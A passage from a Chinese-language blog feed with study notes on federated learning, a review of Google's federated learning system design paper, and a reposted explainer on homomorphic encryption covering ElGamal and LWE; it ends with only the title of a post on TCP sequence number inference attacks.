    <content type="html"><![CDATA[<h3 id="1-提出背景"><a href="#1-提出背景" class="headerlink" title="1. 提出背景"></a>1. 提出背景</h3><p>当前AI面临着两大挑战：信息孤岛、隐私保护。当前的互联网业务对隐私保护的需求日益增长，在数据的共享方面阻力在增加，而在传统的模型训练中没有考虑数据聚合的可行性，所以提出FL。</p><h3 id="2-概述"><a href="#2-概述" class="headerlink" title="2. 概述"></a>2. 概述</h3><p>Federated Learning这一概念最早由Google提出：在防止数据泄露的前提下从分布式数据中训练学习模型。</p><blockquote><p>To build machine learning models based on data sets that are distributed across multiple devices while preventing data leakage.</p></blockquote><h4 id="2-1-定义"><a href="#2-1-定义" class="headerlink" title="2.1 定义"></a>2.1 定义</h4><p>定义N个数据拥有者${F_1…F_n}$，都愿意贡献相应数据${D_1…D_n}$共同训练一个机器学习模型。在传统的模式下，我们会把这些数据组合起来$D&#x3D;D_1\cup …\cup D_n$训练一个模型$M_{SUM}$。而在FL的机制中，数据拥有者可以在不暴露自己数据的情况下训练模型$M_{FED}$。除此之外，我们将$M_{FED}$这一模型的精度（记为$V_{FED}$）应该与$V_{SUM}$非常接近。设$\delta$是一个非负实数，若：</p><p>$\mid V_{FED}-V{SUM}\mid&lt;\delta$ </p><p>我们说此FL算法具有$\delta ​$精度损失（$\delta-accuracy\  loss​$）。</p><h4 id="2-2-FL的安全性"><a href="#2-2-FL的安全性" class="headerlink" title="2.2 FL的安全性"></a>2.2 FL的安全性</h4><p>安全性是FL所要关注的一个重要问题，在目前的研究中有以下几种方案：</p><ol><li><p>安全多方计算（Secure Multiparty Computation）：可以在模型包含的多方上保证<strong>完全零知识</strong>：每一方只知道其自身的输入和输出。</p></li><li><p>差分隐私（Differential Privacy)：在数据中添加噪声或使用一些泛化方法使得数据中的某些敏感属性变得更模糊，直到第三方不能够分辨出其中的个体。但此种方法仍需要进行数据转移，所以不可避免的仍然在一定程度上存在安全性和准确性两方面的trade-offs.</p></li><li><p>同态加密（Homomorphic Encryption)：参考<a href="https://adamyoung71.github.io/2019/10/22/Homomorphic-Encryption/">同态加密</a>，此种方法在隐私保护方面比较好，但在进行非线性方程计算式需要对其进行多项式近似，使得其准确性收到一定影响。（更新：probable solution：<img src="https://adamyoung71.github.io/img/in-post/Reviews/FL-concepts-and-applications/Scenario-of-learning-over-multi-key-encrypted-data.png" alt="Scenario-of-learning-over-multi-key-encrypted-data"></p><hr></li></ol><ul><li>使用多密钥加密系统</li><li>The computations not supported by the partially homomorphic encryption are outsourced to a semi-trusted third party (or STTP), reducing the Data Owners’ involvement in the machine learning process.</li><li>use additive homomorphic cryptosystems, so the outsourced operation is the modular multiplication.</li><li>Since cryptosystems operate on integers, the data have to be converted into a finite-precision representation before being encrypted</li><li>In particular, we propose to use a minimal set that includes the other operation that <strong>preserves the ring structure</strong> of input plain- texts, which in the case under consideration (additive homomorphic encryption) is the modular multiplication conditional branching instructions (comparison).</li></ul><hr><p>​</p><ol><li>区块链</li></ol><h4 id="2-3-FL的分类"><a href="#2-3-FL的分类" class="headerlink" title="2.3 FL的分类"></a>2.3 FL的分类</h4><ol><li><strong>Horizontal Federated Learning:</strong> 两个数据集拥有相同的特征空间和不同的样本。例如两家异地公司业务相似，但却拥有交集很小的客户。<img src="https://adamyoung71.github.io/img/in-post/Reviews/FL-concepts-and-applications/horizontal-federated-learning.png" alt="horizontal-federated-learning"></li><li><strong>Vertical Federated Learning:</strong> 两个数据集拥有相同的样本ID但特征空间不同。例如两家同地公司业务不同，但用户交集较大。<img src="https://adamyoung71.github.io/img/in-post/Reviews/FL-concepts-and-applications/vertical-federated-learning.png" alt="vertical-federated-learning"></li><li><strong>Federated Transfer Learning:</strong> 数据集在样本和特征空间上均不同。通常的做法是先在比较有限的overlap上学习然后再应用到单侧特征的预测中。<img src="https://adamyoung71.github.io/img/in-post/Reviews/FL-concepts-and-applications/federated-transfer-learning.png" alt="federated-transfer-learning"></li></ol><h4 id="2-4-FL的系统结构"><a href="#2-4-FL的系统结构" class="headerlink" title="2.4 FL的系统结构"></a>2.4 FL的系统结构</h4><ol><li><strong>Horizontal Federated Learning：</strong></li></ol><p>  <img src="https://adamyoung71.github.io/img/in-post/Reviews/FL-concepts-and-applications/architecture-of-horizontal-federated-learning.png" alt="architecture-of-horizontal-federated-learning"></p><p>  Step 1: 参与者在本地计算梯度，再使用加密技术向服务器发送选择出的一部分梯度。</p><p>  Step 2：服务器在不获得参与者信息的前提下进行安全聚合。</p><p>  Step 3：服务器发回聚合结果。</p><p>  Step 4：参与者解密结果后更新其对应模型，直到loss function 收敛。</p><p>  此结构与机器学习算法无关，最后的模型参数也由所有参与者共享。</p><p>  <strong>安全性：</strong>可能受到生成对抗网络(GAN)的攻击。</p><ol start="2"><li><strong>Vertical Federated Learning</strong>：<img src="https://adamyoung71.github.io/img/in-post/Reviews/FL-concepts-and-applications/architecture-of-vertical-federated-learning.png" alt="architecture-of-vertical-federated-learning"></li></ol><p>第一步：加密实体对齐：由于参与者的用户并不相同，故需要在模型训练前使用加密的ID对相同用户进行对齐。</p><p>第二步：加密模型训练</p><p>​Step 1：C初始化密钥对，将公钥发送给A，B。</p><p>​Step 2：A与B计算各自梯度和损失后将结果加密发送给对方。</p><p>​Step 3：A与B在对加密的梯度进行计算后将结果用C提供的公钥再次加密，分别发给C。</p><p>​Step 4：C进行解密后将梯度和损失发回给A、B，A、B解密后对齐模型进行更新。</p>]]></content>
    
    
    
    <tags>
      
      <tag>Federated Learning</tag>
      
      <tag>Reviews</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Review on: TOWARDS FEDERATED LEARNING AT SCALE: SYSTEM DESIGN</title>
    <link href="/2019/10/22/2019-10-22-Review-on-TOWARDS-FEDERATED-LEARNING-AT-SCALE-SYSTEM-DESIGN/"/>
    <url>/2019/10/22/2019-10-22-Review-on-TOWARDS-FEDERATED-LEARNING-AT-SCALE-SYSTEM-DESIGN/</url>
    
    <content type="html"><![CDATA[<blockquote><p>Bonawitz, Keith et al. “Towards Federated Learning at Scale: System Design.” (2019): n. pag. Web.</p></blockquote><h2 id="1-介绍"><a href="#1-介绍" class="headerlink" title="1. 介绍"></a>1. 介绍</h2><ul><li>趋势：同步的大批量训练。</li><li>增强安全性：DP，SecAgg。</li><li>场景：使用FL在安卓手机上训练模型并用Server进行聚合。</li></ul><h2 id="2-Protocol"><a href="#2-Protocol" class="headerlink" title="2. Protocol"></a>2. Protocol</h2><p><img src="https://adamyoung71.github.io/img/in-post/Reviews/Towards-Federated-Learning-at-Scale-System-Design/Federated-Learning-Protocol.png" alt="Federated Learning Protocol"></p><ol><li><p><strong>基本概念</strong>：Server在时间窗口内从声明可用的device中选择一个子集（典型大小为几百个，SecAgg所限制），在训练期间device与设备保持连接。之后，server向device发送当前的Model checkpoint，device本地更新模型后上传。</p></li><li><p><strong>训练阶段：</strong></p><ol><li>选择（Selection）：根据一定条件选择设备（充电中、使用WiFi），未选择的设备会被告知稍后特定时间点重连。</li><li>配置（Configuration)：server向device发送当前计划和模型参数。</li><li>报告（reporting）：server等待device上传数据，进行Federated Averaging并告知下次连接时间。若成功则更新全局模型，失败则放弃此轮训练。掉队节点会被直接忽略（协议具有一定容忍度）</li><li>选择和报告阶段由一系列参数控制：device数量、超时、最小目标（决定本轮是否被丢弃）。</li></ol></li><li><p><strong>流控制机制Pace Steering</strong></p><p>​对于小规模FL，PS主要用来保证有足够数量的device同时连接server。对于大规模FL，PS主要用来使随机化报告时间，避免“Thundering Herd”问题。同时调整时间窗口减小昼夜等设备活性差异对训练造成的影响.</p></li></ol><h2 id="3-Device"><a href="#3-Device" class="headerlink" title="3. Device"></a>3. Device</h2><p><img src="https://adamyoung71.github.io/img/in-post/Reviews/Towards-Federated-Learning-at-Scale-System-Design/Device-Architecture.png" alt="Device Architecture"></p><ol><li><strong>程序配置（Programmatic Configuration）:</strong> 应用向FL Runtime提供其训练信息和数据集。重要条件是要对设备使用影响较小。当某些条件不满足时（不再充电等），Runtime会放弃本轮训练。</li><li>**任务调用（Job Invocation）: **Runtime向Server报告准备就绪，请求训练方案和数据。</li><li><strong>任务执行（Task Execution）:</strong> 被选中的设备按照下发的计划进行训练。</li><li>**汇报（Reporting）: **训练结束后上传参数更新。</li></ol><p><strong>特点</strong></p><ol><li>多租户（Multi-Tenancy）：共性被共享，个性被隔离，从而可以在单个应用中进行多种训练。</li><li>验证性（Attestation）：使用Google SaftyNet认证机制。</li></ol><h2 id="4-Server"><a href="#4-Server" class="headerlink" title="4. Server"></a>4. Server</h2><p><strong>结构</strong></p><ol><li><p>Coordinators: 最高级别角色，有多个，每一个分管一个设备群。总体调度。</p></li><li><p>Selector：按照Coordinator的需求允许设备接入，并转发给Aggregators。</p></li><li><p>Master Aggregators：只有主聚合者完成聚合后才会写入新的checkpoint。</p></li><li><p>Pipelining：配置和报告是序列化的，故因为选择过程不需要之前轮次的输入，可以与上一轮的配置报告一起进行。</p></li><li><p>错误模型：Aggregator 或Selector失效时，只有其连接的部分设备会丢失；MA失效时本轮会失败但是可以由Coordinator重启。若C失效，Selector会探测到并重新生成。</p><p><img src="https://adamyoung71.github.io/img/in-post/Reviews/Towards-Federated-Learning-at-Scale-System-Design/actor-model.png" alt="actor-model"></p></li></ol><h2 id="6-SecAgg"><a href="#6-SecAgg" class="headerlink" title="6. SecAgg"></a>6. SecAgg</h2><ul><li>前两轮：Server和每一个device建立共享秘密（DH）</li><li>第三轮：device上传加密数据。</li><li>第四轮：device发送特定信息帮助server解密模型（非必须，只要达到规定最小数量即可）</li></ul><p><strong>问题</strong></p><ul><li>计算成本随着device数量急剧增加。</li></ul><p><img src="https://adamyoung71.github.io/img/in-post/Reviews/Towards-Federated-Learning-at-Scale-System-Design/algorithm.png" alt="algorithm"></p>]]></content>
    
    
    
    <tags>
      
      <tag>Federated Learning</tag>
      
      <tag>Reviews</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Homomorphic Encryption: principle and application</title>
    <link href="/2019/10/22/2019-10-23-Homomorphic-Encryption/"/>
    <url>/2019/10/22/2019-10-23-Homomorphic-Encryption/</url>
    
    <content type="html"><![CDATA[<blockquote><p>转载自：同态加密的实现原理是什么？在实际中有何应用？ - 刘巍然-学酥的回答 - 知乎       <a href="https://www.zhihu.com/question/27645858/answer/37598506">https://www.zhihu.com/question/27645858/answer/37598506</a></p></blockquote><h1 id="This-is-a-test"><a href="#This-is-a-test" class="headerlink" title="This is a test."></a>This is a test.</h1><h2 id="1-概览：同态加密的概念"><a href="#1-概览：同态加密的概念" class="headerlink" title="1. 概览：同态加密的概念"></a>1. 概览：同态加密的概念</h2><p>同态加密（Homomorphic Encryption）是很久以前密码学界就提出来的一个Open Problem。早在1978年，Ron Rivest, Leonard Adleman, 以及Michael L. Dertouzos就以银行为应用背景提出了这个概念[RAD78]。对，你没有看错，Ron Rivest和Leonard Adleman分别就是著名的RSA算法中的R和A。至于中间的S，Adi Shamir，现在仍然在为密码学贡献新的工作。</p><h3 id="什么是同态加密？"><a href="#什么是同态加密？" class="headerlink" title="什么是同态加密？"></a><strong>什么是同态加密？</strong></h3><p>提出第一个构造出全同态加密（Fully Homomorphic Encryption）[Gen09]的Craig Gentry给出的直观定义最好：</p><blockquote><p>A way to delegate  of your data, without giving away access to it.</p></blockquote><p>这是什么意思呢？一般的加密方案关注的都是<strong>数据存储安全</strong>。即，我要给其他人发个加密的东西，或者要在计算机或者其他服务器上存一个东西，我要对数据进行加密后在发送或者存储。没有密钥的用户，不可能从加密结果中得到有关原始数据的任何信息。只有拥有密钥的用户才能够正确解密，得到原始的内容。我们注意到，这个过程中<strong>用户是不能对加密结果做任何操作的</strong>，只能进行存储、传输。对加密结果做任何操作，都将会导致错误的解密，甚至解密失败。</p><p>同态加密方案最有趣的地方在于，其关注的是<strong>数据处理安全</strong>。同态加密提供了一种<strong>对加密数据进行处理的功能</strong>。也就是说，其他人可以对加密数据进行处理，但是处理过程不会泄露任何原始内容。同时，拥有密钥的用户对处理过的数据进行解密后，得到的正好是处理后的结果。</p><p>有点抽象？我们举个实际生活中的例子。有个叫Alice的用户买到了一大块金子，她想让工人把这块金子打造成一个项链。但是工人在打造的过程中有可能会偷金子啊，毕竟就是一克金子也值很多钱的说… 因此能不能有一种方法，让工人可以对金块进行加工（delegate processing of your data），但是不能得到任何金子（without giving away access to it）？当然有办法啦，Alice可以这么做：</p><ul><li>Alice将金子锁在一个密闭的盒子里面，这个盒子安装了一个手套。</li><li>工人可以带着这个手套，对盒子内部的金子进行处理。但是盒子是锁着的，所以工人不仅拿不到金块，连处理过程中掉下的任何金子都拿不到。</li><li>加工完成后。Alice拿回这个盒子，把锁打开，就得到了金子。</li></ul><p>这个盒子的样子大概是这样的：</p><p><img src="https://adamyoung71.github.io/img/in-post/post-homo-encryp/HE-illustrator.jpg" alt="HE-illustrator"></p><p>这里面的对应关系是：</p><ul><li>盒子：加密算法</li><li>盒子上的锁：用户密钥</li><li>将金块放在盒子里面并且用锁锁上：将数据用同态加密方案进行加密</li><li>加工：应用同态特性，在无法取得数据的条件下直接对加密结果进行处理</li><li>开锁：对结果进行解密，直接得到处理后的结果</li></ul><h3 id="同态加密哪里能用？"><a href="#同态加密哪里能用？" class="headerlink" title="同态加密哪里能用？"></a>同态加密哪里能用？</h3><p>这几年不是提了个云计算的概念嘛。同态加密几乎就是为云计算而量身打造的！我们考虑下面的情景：一个用户想要处理一个数据，但是他的计算机计算能力较弱。这个用户可以使用云计算的概念，让云来帮助他进行处理而得到结果。但是如果直接将数据交给云，无法保证安全性啊！于是，他可以使用同态加密，然后让云来对加密数据进行直接处理，并将处理结果返回给他。这样一来：</p><ul><li>用户向云服务商付款，得到了处理的结果；</li><li>云服务商挣到了费用，并在不知道用户数据的前提下正确处理了数据；</li></ul><p>这方法简直完美啊有没有？！但是，这么好的特性肯定会带来一些缺点。同态加密现在最需要解决的问题在于：效率。效率一词包含两个方面，一个是加密数据的处理速度，一个是这个加密方案的数据存储量。我们可以直观地想一想这个问题：</p><ul><li>工人戴着手套加工金子，肯定没有直接加工来得快嘛~ 也就是说，隔着手套处理，精准度会变差（现有构造会有误差传递问题），加工的时间也会变得更长（密文的操作花费更长的时间），工人需要隔着操作，因此也需要更专业（会正确调用算法）。</li><li>金子放在盒子里面，为了操作，总得做一个稍微大一点的盒子吧，要不然手操作不开啊（存储空间问题）。里面也要放各种工具吧，什么电钻啦，锉刀啦，也需要空间吧？</li></ul><h3 id="这种加密方案真的有在研究？"><a href="#这种加密方案真的有在研究？" class="headerlink" title="这种加密方案真的有在研究？"></a><strong>这种加密方案真的有在研究？</strong></h3><p>我举3个简单的例子：</p><ol><li>第一个构造出全同态加密方案的人是Gentry，这是他在Stanford攻读博士学位的研究成果。Gentry毕业后去哪里了呢？IBM。大家知道IBM可是一个云服务提供商啊！在IBM，Gentry和另一个密码学大牛Halevi继续进行同态加密及其相关的研究，并实现了一些同态加密方案。如果IBM真的做出了可以在实际使用的同态加密方案，那么其他云服务提供商就可以拜拜了啊！这游戏不用玩了啊，人家能在不知道数据内容得前提下处理数据啊，毕竟谁都不想把数据泄露给其他公司啊！</li><li>国内的某个大公司（具体是哪个我就不透露了…）对这方面的研究非常感兴趣，我也和他们做了一次交流，并且初步达成了一定的研究大方向。要不怎么我现在也去弄这个头大的东西呢。要知道，国内的公司也没闲着，这是制高点，拿到了就是一家独大，而且是超级技术垄断，不公开源代码或者不了解内部构造的话想仿造都仿造不了啊…不过，这方面的研究说实话Gap确实大，入门起码要3个月的时间，还不一定做的出来…</li><li>即使没有实现全同态加密，也可以得到其他一些很有趣的结论。而每一个结论都可能引发技术垄断。这些结论由于涉及到了一定的基础知识，我在后面中会进行介绍。</li></ol><p>业界如何评价全同态加密的构造？</p><p>在此引用一个前辈的话：</p><blockquote><p>如果未来真的做出了Practical Fully Homomorphic Encryption，那么Gentry一定可以得到图灵奖。</p></blockquote><p>剩下的，我也就不用多说了吧… </p><h2 id="二、-同态加密的定义、安全性和简单实例"><a href="#二、-同态加密的定义、安全性和简单实例" class="headerlink" title="二、 同态加密的定义、安全性和简单实例"></a>二、 同态加密的定义、安全性和简单实例</h2><p>下面的内容，如果可以接受符号表述，具有一点密码学的知识，对抽象代数有一定的了解的话，可能体会的更深刻哦。</p><h3 id="同态加密具体如何定义？"><a href="#同态加密具体如何定义？" class="headerlink" title="同态加密具体如何定义？"></a>同态加密具体如何定义？</h3><p>我们在云计算应用场景下面进行介绍：</p><p><img src="https://adamyoung71.github.io/img/in-post/post-homo-encryp/cloud-computing-scenario.jpg" alt="cloud-computing-scenario"></p><p>Alice通过Cloud，以Homomorphic Encryption（以下简称HE）处理数据的整个处理过程大致是这样的：</p><ol><li>Alice对数据进行加密。并把加密后的数据发送给Cloud；</li><li>Alice向Cloud提交数据的处理方法，这里用函数f来表示；</li><li>Cloud在函数f下对数据进行处理，并且将处理后的结果发送给Alice；</li><li>Alice对数据进行解密，得到结果。</li></ol><p>据此，我们可以很直观的得到一个HE方案应该拥有的函数：</p><ol><li>KeyGen函数：密钥生成函数。这个函数应该由Alice运行，用于产生加密数据Data所用的密钥Key。当然了，应该还有一些公开常数PP（Public Parameter）；</li><li>Encrypt函数：加密函数。这个函数也应该由Alice运行，用Key对用户数据Data进行加密，得到密文CT（Ciphertext）；</li><li>Evaluate函数：评估函数。这个函数由Cloud运行，在用户给定的数据处理方法f下，对密文进行操作，使得结果相当于用户用密钥Key对f(Data)进行加密。</li><li>Decrypt函数：解密函数。这个函数由Alice运行，用于得到Cloud处理的结果f(Data)。</li></ol><p>那么，f应该是什么样子的呢？HE方案是支持任意的数据处理方法f？还是说只支持满足一定条件的f呢？根据f的限制条件不同，HE方案实际上分为了两类：</p><ul><li>Fully Homomorphic Encryption (FHE)：这意味着HE方案支持任意给定的f函数，只要这个f函数可以通过算法描述，用计算机实现。显然，FHE方案是一个非常棒的方案，但是计算开销极大，暂时还无法在实际中使用。</li><li>Somewhat Homomorphic Encryption (SWHE)：这意味着HE方案只支持一些特定的f函数。SWHE方案稍弱，但也意味着开销会变得较小，容易实现，现在已经可以在实际中使用。</li></ul><h3 id="什么叫做安全的HE？"><a href="#什么叫做安全的HE？" class="headerlink" title="什么叫做安全的HE？"></a><strong>什么叫做安全的HE？</strong></h3><p>HE方案的最基本安全性是语义安全性（Semantic Security）。直观地说，就是密文（Ciphertext）不泄露明文（Plaintext）中的任意信息。这里密文的意思就是加密后的结果；明文的意思就是原始的数据。如果用公式表述的话，为：</p><p>$\forall m_0,m_1,{Encrypt}(PK,m_0)\approx {Encrypt}(PK,m_1)​$</p><p>这里PK代表公钥（Public Key），是非对称加密体制中可以公开的一个量。公式中的”约等于”符号，意味着<strong>多项式不可区分性</strong>，即不存在高效的算法，可以区分两个结果，即使已知m0, m1和pk。有人说了，这怎么可能？我已经知道m0, m1了，我看到加密结果后，对m0或者m1在执行一次加密算法，然后看哪个结果和给定结果相同不就完了？注意了，加密算法中还用到一个很重要的量：随机数。也就是说，对于同样的明文m进行加密，得到的结果都不一样，即一个明文可以对应多个密文（many ciphertexts per plaintext）。</p><p>在密码学中，还有更强的安全性定义，叫做选择密文安全性（Chosen Ciphertext Security）。选择密文安全性分为非适应性（None-Adaptively）和适应性（Adaptively），也就是CCA1和CCA2。 </p><p>HE方案是不可能做到CCA2安全的。那么，HE方案能不能做到CCA1安全呢？至今还没有CCA1安全的FHE方案，但是在2010年，密码学家们就已经构造出了CCA1的SWHE方案了[LMSV10]。</p><p>HE方案还有一方面的安全性，就是函数f是不是也可以保密呢？这样的话HE就更厉害了！Cloud不仅不能够得到数据本身的内容，现在连数据怎么处理的都不知道，只能按照给定的算法执行，然后返回的结果就是用户想要的结果。如果HE方案满足这样的条件，我们称这个HE方案具有Function-Privacy特性。不过，仅我个人所了解到的，现在还没有Function-privacy FHE，甚至Function-privacy SWHE也没有。</p><p>不过，Function-privacy引入了另一个很有趣的概念，那就是我们能不能反过来，就做到Function-privacy，但是不用做到数据隐私呢？这其实也有很好的应用场景：比如一个天才设计了一个算法（想象Jeffrey Dean设计了历史上第一个O(1&#x2F;n)复杂度算法，或者设计了一个O(n^2)算法，但是是用来解决旅行商问题的），但是他不想把这个算法公开。他只提供一个程序，这个程序不泄露任何算法本身的内容，人们只能调用这个算法，然后得到输出的结果。这个特别像什么？对啦，就是程序的编译与反编译嘛。如果Function-privacy的加密设计出来了，那么计算机科学家们就可以一劳永逸地阻止程序反编译，甚至连破解都杜绝了。满足这样条件的加密方案，即，给算法加密的方案，叫做<strong>Obfuscation</strong>。很遗憾，2001年，密码学家们已经证明，不可能实现严格意义上的Obfuscation [BGIRSVY01]。但是，可以做到一个称为Indistinguishability Obfuscation的东西。这个东西是密码学家们研究同态加密过程中的一个产物，现在已经有了一些候选方案了[GGHRSB13]。这个就不展开说了，是另一个领域的内容。</p><h3 id="举个SWHE的例子？"><a href="#举个SWHE的例子？" class="headerlink" title="举个SWHE的例子？"></a><strong>举个SWHE的例子？</strong></h3><p>在2009年Graig Gentry给出FHE的构造前，很多加密方案都具有Somewhat Homomorphism的性质。实际上，最最经典的RSA加密，其本身对于乘法运算就具有同态性。Elgamal加密方案同样对乘法具有同态性。Paillier在1999年提出的加密方案也具有同态性，而且是可证明安全的加密方案哦！后面还有很多啦，比如Boneh-Goh-Nissim方案[BGN05], Ishai-Paskin方案等等。不过呢，2009年前的HE方案要不<strong>只具有加同态性</strong>，要不<strong>只具有乘同态性</strong>，但是不能同时具有加同态和乘同态。这种同态性用处就不大了，只能作为一个性质，这类方案的同态性一般也不会在实际中使用的。</p><p>在此我们看一下Elgamal加密方案，看看怎么个具有乘同态特性。Elgamal加密方案的密文形式为：</p><p>${CT&#x3D;(C_1,C_2)&#x3D;(g^T,h^r\cdot m)}$</p><p>其中r是加密过程中选的一个随机数，g是一个生成元，h是公钥。如果我们有两个密文：</p><p>${CT_1&#x3D;(g^{r_1},h^{r_1}\cdot m_1), CT_2&#x3D;(g^{r_2},h^{r_2}\cdot m_2)}$</p><p>我们把这两个密文的第一部分相乘，第二部分相乘，会得到：</p><p>${CT&#x3D;(g^{r1}\cdot g^{r_2},h^{r_1}\cdot m_1\cdot h^{r_2}\cdot m_2)&#x3D;(g^{r_1+r_2},h^{r_1+r_2}\cdot m_1m_2)}​$</p><p>也就是说，相乘以后的密文正好是m1m2所对应的密文。这样，用户解密后得到的就是m1m2的结果了。而且注意，整个运算过程只涉及到密文和公钥，运算过程不需要知道m1m2的确切值。所以我们说Elgamal具有乘同态性质。但是很遗憾，其没有加同态性质。</p><h3 id="HE的效率如何？"><a href="#HE的效率如何？" class="headerlink" title="HE的效率如何？"></a><strong>HE的效率如何？</strong></h3><p>2011年，Gentry和Halevi在IBM尝试实现了两个HE方案：Smart-Vercauteren的SWHE方案[SV10]以及Gentry的FHE方案[Gen09]，并公布了效率。结果如何呢？我们给出Gentry公布的数据（原始数据可以在<a href="https://link.zhihu.com/?target=http://crypto.biu.ac.il/winterschool2012/">2nd Bar-Ilan Winter School on Cryptography</a>找到）Smart-Vercauteren的SWHE方案效率如下：</p><p><img src="https://adamyoung71.github.io/img/in-post/post-homo-encryp/SWHE-efficiency.jpg" alt="SWHE-efficiency"></p><p>看着好像还行，不过这Dimension有点夸张啊…也就是说公钥很长…那么，Gentry的FHE方案如何呢？效率如下：</p><p><img src="https://adamyoung71.github.io/img/in-post/post-homo-encryp/FHE-efficiency.jpg" alt="FHE-efficiency"></p><p>公钥2.3GB，KeyGen需要2个小时，也是醉了…</p><h2 id="三、-现有HE方案的安全假设和构造概览"><a href="#三、-现有HE方案的安全假设和构造概览" class="headerlink" title="三、 现有HE方案的安全假设和构造概览"></a>三、 现有HE方案的安全假设和构造概览</h2><p>如果你致力于HE的研究，我们给出一些可用的资料。</p><h3 id="如何证明HE方案的安全性？"><a href="#如何证明HE方案的安全性？" class="headerlink" title="如何证明HE方案的安全性？"></a><strong>如何证明HE方案的安全性？</strong></h3><p>对于现在的密码学方案，安全性证明要把它规约到解决一个公开的困难问题上。简单地说，就是如果方案被破解了，那么攻击者可以用破解算法解决一个困难问题。然而，由于这个困难问题还没有找到高效的（多项式复杂度的）算法，因此方案是安全的。</p><p>那么，2009年以后的HE方案是建立在哪个困难问题上呢？是一个被称作Learning With Errors（LWE）的困难问题[Reg05]。后来，随着另一个新的工具出现，密码学家们又致力于基于Ring Learning With Errors（Ring-LWE）问题的HE构造[LPR10]。</p><p>Ring-LWE涉及到抽象代数中Ring以及Ideal的概念，稍显复杂。我们这里简单介绍一下LWE问题，Ring-LWE问题和它有点像。LWE问题分为两类，一个叫做Search-LWE，一个叫做Decision-LWE。Search-LWE可以简单地用下图来表示，其中A是一个m*n的矩阵，由Zp中的元素组成；s是一个n维向量；e是一个m维向量；b是一个m维向量：</p><p><img src="https://adamyoung71.github.io/img/in-post/post-homo-encryp/Ring-LWE.jpg" alt="Ring-LWE"></p><p>这个问题大致为：选择一个秘密（secret）值s，并选择一个范数很小的扰乱（error）向量e，计算b &#x3D; As + e mod q。这个问题是：只给定矩阵A和计算的结果b（图中红色部分），不给定s和e（途中蓝色部分），反过来求秘密值s的大小。Decision-LWE问题有点类似：给定A和b，算法需要判断，b是由某个s通过As + e计算得来的呢，还是就是一个随机量呢？这里有几个小问题：</p><ol><li>m和n有多大？这取决于我们要求安全度有多高了。实际上这还取决于一些其他因素。</li><li>e的范数要多么小？LWE要求e的取值要满足离散高斯分布（Discrete Gaussian Distribution）。</li><li>怎么想到的这么个问题？实际上，LWE问题是Lattice中的一个问题。Lattice是什么呢？这个展开说就有点累了…</li></ol><h3 id="介绍一下构造FHE的思路？"><a href="#介绍一下构造FHE的思路？" class="headerlink" title="介绍一下构造FHE的思路？"></a><strong>介绍一下构造FHE的思路？</strong></h3><p>FHE最重要的一点是Fully，就是说要支持任意的函数f。因此我们也可以很明显看出，想要构造FHE，就需要了解计算机是如何计算的。一般来说，我们有两种思路：</p><ul><li><strong>从计算机原理考虑</strong>。计算机无论做何种运算，归根到底都是位运算。那么，计算机至少要支持哪些位运算，才能够支持所有的运算呢？实际上，一个计算机只要支持逻辑与运算（AND），以及异或运算（XOR），那么这个计算机理论上就可以实现计算机的其他运算了（我们称之为图灵完备性，Turing Completeness）</li><li><strong>从抽象代数考虑</strong>。我们只需要加法和乘法就可以完成全部运算了。但其实更严格的说，只要我们在一个域（Field）上构造HE，理论上我们就可以支持所有的f。</li></ul><p>基于LWE问题的FHE只能针对1 bit进行加密，因此现在的构造都是从计算机原理考虑。也就是在bit的层面上实现FHE方案，或者更严谨地说，从电路层（Circuit）实现FHE方案。具体构造呢，大家刻意参考下面给出的参考文献了。实话实说，我自己也没有都消化，或者更严格地说，Regev的LWE构造论文我还没有完全看明白。因此，我在此也号召密码学爱好者一起研究啦~</p><p>参考文献</p><p>[RAD78] Ron Rivest, Leonard Adleman, and Michael L. Dertouzos. On data banks and privacy homomorphisms. Foundations of Secure Computation, 1978.</p><p>[Gen09] Craig Gentry. Fully homomorphic encryption using ideal lattices. STOC 2009. Also, see “A fully homomorphic encryption scheme”, PhD thesis, Stanford University, 2009.</p><p>[LMSV10] Jake Loftus, Alexander May, Nigel P. Smart, and Frederik Vercauteren. On CCA-Secure Fully Homomorphic Encryption. Cryptology ePrint Archive 2010&#x2F;560.</p><p>[BGIRSVY01] Boaz Barak, Oded Goldreich, Russell Impagliazzo, Steven Rudich, Amit Sahai, Salil Vadhan, and Key Yang. On the (Im)possibility of Obfuscating Programs. Crypto 2001.</p><p>[GGHRSB13] Sanjam Garg, CraigGentry, Shai Halevi, MarianaRaykova, Amit Sahai, and Brent Waters. Candidate indistinguishability obfuscation and functional encryption for all circuits. Foundations of Computer Science, 2013.</p><p>[Paillier99] Pascal Paillier. Public-Key Cryptosystems Based on Composite Degree Residuosity Classes. Eurocrypt 1999.</p><p>[BGN05] Dan Boneh, Eu-Jin Goh, and Kobbi Nissim. Evaluating 2-DNF formulas on ciphertexts. TCC 2005.</p><p>[GH11a] Craig Gentry and Shai Halevi. Implementing gentry’s fully-homomorphic encryption scheme. Eurocrypt 2011.</p><p>[SV10] Nigel P. Smart and Frederik Vercauteren. Fully homomorphic encryption with relatively small key and ciphertext sizes. PKC 2010.</p><p>[Reg05] Oded Regev. On lattices, learning with errors, random linear codes, and cryptography. STOC 2005.</p><p>[LPR10] Vadim Lyubashevsky, Chris Peikert, and Oded Regev. On ideal lattices and learning with errors over rings. Eurocrypt 2010.</p>]]></content>
    
    
    
    <tags>
      
      <tag>Cryptography</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Improvement on TCP Sequence Number Inference Attack</title>
    <link href="/2019/10/12/2019-10-13-TCP%E9%A2%84%E6%B5%8B%E6%94%BB%E5%87%BB%E7%9A%84%E6%94%B9%E8%BF%9B-K%E5%88%86%E6%9F%A5%E6%89%BE%E6%B3%95/"/>
    <url>/2019/10/12/2019-10-13-TCP%E9%A2%84%E6%B5%8B%E6%94%BB%E5%87%BB%E7%9A%84%E6%94%B9%E8%BF%9B-K%E5%88%86%E6%9F%A5%E6%89%BE%E6%B3%95/</url>
    
